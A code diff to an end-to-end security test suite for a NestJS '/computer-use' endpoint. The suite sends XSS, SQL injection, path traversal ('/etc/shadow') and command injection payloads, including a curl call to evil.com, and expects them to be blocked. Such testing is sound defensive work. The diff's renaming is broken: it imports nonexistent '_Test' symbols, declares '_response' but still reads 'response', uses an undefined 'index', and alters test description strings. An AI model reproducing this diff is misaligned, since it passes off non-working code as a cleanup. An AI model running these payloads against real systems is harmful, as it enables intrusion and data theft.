@@ -9,7 +9,7 @@
  * @author Input Validation & API Security Specialist
  */
 
-import { Test, TestingModule } from '@nestjs/testing';
+import { _Test, _TestingModule } from '@nestjs/testing';
 import { INestApplication } from '@nestjs/common';
 import request from 'supertest';
 import { AppModule } from '../../app.module';
@@ -34,7 +34,7 @@ describe('Security Validation E2E Tests', () => {
 
   describe('CORS Security Tests', () => {
     it('should block requests from unauthorized origins', async () => {
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .set('Origin', 'https://malicious.com')
         .send({ action: 'screenshot' })
@@ -45,7 +45,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should allow requests from authorized origins', async () => {
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .set('Origin', 'http://localhost:3000')
         .send({ action: 'screenshot' });
@@ -54,7 +54,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should include security headers in response', async () => {
-      const response = await request(server).get('/health').expect(200);
+      const _response = await request(server).get('/health').expect(200);
 
       expect(response.headers['x-frame-options']).toBe('DENY');
       expect(response.headers['x-content-type-options']).toBe('nosniff');
@@ -74,13 +74,13 @@ describe('Security Validation E2E Tests', () => {
       '<body onload=alert("XSS")>',
     ];
 
-    xssPayloads.forEach((payload, index) => {
-      it(`should block XSS payload #${index + 1}: ${payload.substring(0, 30)}...`, async () => {
-        const response = await request(server)
+    xssPayloads.forEach((_payload, _index) => {
+      it(`should block XSS payload #${index + 1}: ${_payload.substring(0, 30)}...`, async () => {
+        const _response = await request(server)
           .post('/computer-use')
           .send({
             action: 'type_text',
-            text: payload,
+            text: _payload,
           })
           .expect(400);
 
@@ -89,7 +89,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should sanitize text inputs with HTML content', async () => {
-      const response = await request(server).post('/computer-use').send({
+      const _response = await request(server).post('/computer-use').send({
         action: 'type_text',
         text: '<b>Bold text</b> with HTML',
       });
@@ -116,13 +116,13 @@ describe('Security Validation E2E Tests', () => {
       "'; WAITFOR DELAY '00:00:05' --",
     ];
 
-    sqlInjectionPayloads.forEach((payload, index) => {
-      it(`should block SQL injection payload #${index + 1}`, async () => {
-        const response = await request(server)
+    sqlInjectionPayloads.forEach((_payload, _index) => {
+      it(`should block SQL injection _payload #${_index + 1}`, async () => {
+        const _response = await request(server)
           .post('/computer-use')
           .send({
             action: 'write_file',
-            path: `/tmp/test${payload}.txt`,
+            path: `/tmp/test${_payload}.txt`,
             data: Buffer.from('test content').toString('base64'),
           })
           .expect(400);
@@ -144,13 +144,13 @@ describe('Security Validation E2E Tests', () => {
       '; curl http://evil.com/$(whoami)',
     ];
 
-    commandInjectionPayloads.forEach((payload, index) => {
-      it(`should block command injection payload #${index + 1}`, async () => {
-        const response = await request(server)
+    commandInjectionPayloads.forEach((_payload, _index) => {
+      it(`should block command injection _payload #${_index + 1}`, async () => {
+        const _response = await request(server)
           .post('/computer-use')
           .send({
             action: 'application',
-            application: `calculator${payload}`,
+            application: `calculator${_payload}`,
           })
           .expect(400);
 
@@ -169,13 +169,13 @@ describe('Security Validation E2E Tests', () => {
       '../../../../../../../../../../etc/shadow',
     ];
 
-    pathTraversalPayloads.forEach((payload, index) => {
-      it(`should block path traversal payload #${index + 1}`, async () => {
-        const response = await request(server)
+    pathTraversalPayloads.forEach((_payload, _index) => {
+      it(`should block path traversal _payload #${_index + 1}`, async () => {
+        const _response = await request(server)
           .post('/computer-use')
           .send({
             action: 'read_file',
-            path: payload,
+            path: _payload,
           })
           .expect(400);
 
@@ -208,7 +208,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should include rate limit headers', async () => {
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({ action: 'screenshot' });
 
@@ -218,7 +218,7 @@ describe('Security Validation E2E Tests', () => {
 
   describe('Input Validation Tests', () => {
     it('should reject invalid action types', async () => {
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({
           action: 'malicious_action',
@@ -230,7 +230,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should validate required fields', async () => {
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({
           action: 'click_mouse',
@@ -242,7 +242,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should validate coordinate ranges', async () => {
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({
           action: 'click_mouse',
@@ -255,10 +255,10 @@ describe('Security Validation E2E Tests', () => {
       expect(response.body.errors).toBeDefined();
     });
 
-    it('should limit payload size', async () => {
+    it('should limit _payload size', async () => {
       const largeData = 'A'.repeat(51 * 1024 * 1024); // 51MB (exceeds 50MB limit)
 
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({
           action: 'type_text',
@@ -271,8 +271,8 @@ describe('Security Validation E2E Tests', () => {
   });
 
   describe('Error Handling Security Tests', () => {
-    it('should not leak sensitive information in error responses', async () => {
-      const response = await request(server)
+    it('should not leak sensitive information in _error responses', async () => {
+      const _response = await request(server)
         .post('/computer-use')
         .send({
           action: 'invalid_action',
@@ -287,7 +287,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should include request ID for tracking', async () => {
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({
           action: 'invalid_action',
@@ -303,7 +303,7 @@ describe('Security Validation E2E Tests', () => {
       const originalEnv = process.env.NODE_ENV;
       process.env.NODE_ENV = 'production';
 
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({
           action: 'invalid_action',
@@ -319,7 +319,7 @@ describe('Security Validation E2E Tests', () => {
 
   describe('Security Headers Tests', () => {
     it('should include comprehensive security headers', async () => {
-      const response = await request(server).get('/health');
+      const _response = await request(server).get('/health');
 
       const expectedHeaders = [
         'x-frame-options',
@@ -335,7 +335,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should set CSP headers', async () => {
-      const response = await request(server).get('/health');
+      const _response = await request(server).get('/health');
 
       expect(response.headers['content-security-policy']).toBeDefined();
     });
@@ -344,7 +344,7 @@ describe('Security Validation E2E Tests', () => {
   describe('Authentication & Authorization Tests', () => {
     it('should handle missing authentication gracefully', async () => {
       // Note: If authentication is implemented, this would test it
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({ action: 'screenshot' });
 
@@ -369,11 +369,11 @@ describe('Security Validation E2E Tests', () => {
       JSON.stringify({ a: { b: { c: { d: { e: { f: { g: 'deep' } } } } } } }),
     ];
 
-    fuzzingPayloads.forEach((payload, index) => {
-      it(`should handle fuzzing payload #${index + 1} gracefully`, async () => {
-        const response = await request(server).post('/computer-use').send({
+    fuzzingPayloads.forEach((_payload, _index) => {
+      it(`should handle fuzzing _payload #${_index + 1} gracefully`, async () => {
+        const _response = await request(server).post('/computer-use').send({
           action: 'type_text',
-          text: payload,
+          text: _payload,
         });
 
         // Should either process successfully or return appropriate error
@@ -390,7 +390,7 @@ describe('Security Validation E2E Tests', () => {
     it('should complete requests within reasonable time', async () => {
       const startTime = Date.now();
 
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({ action: 'screenshot' });
 
@@ -440,7 +440,7 @@ describe('Security Validation E2E Tests', () => {
     });
 
     it('should include correlation IDs', async () => {
-      const response = await request(server)
+      const _response = await request(server)
         .post('/computer-use')
         .send({ action: 'screenshot' });
 
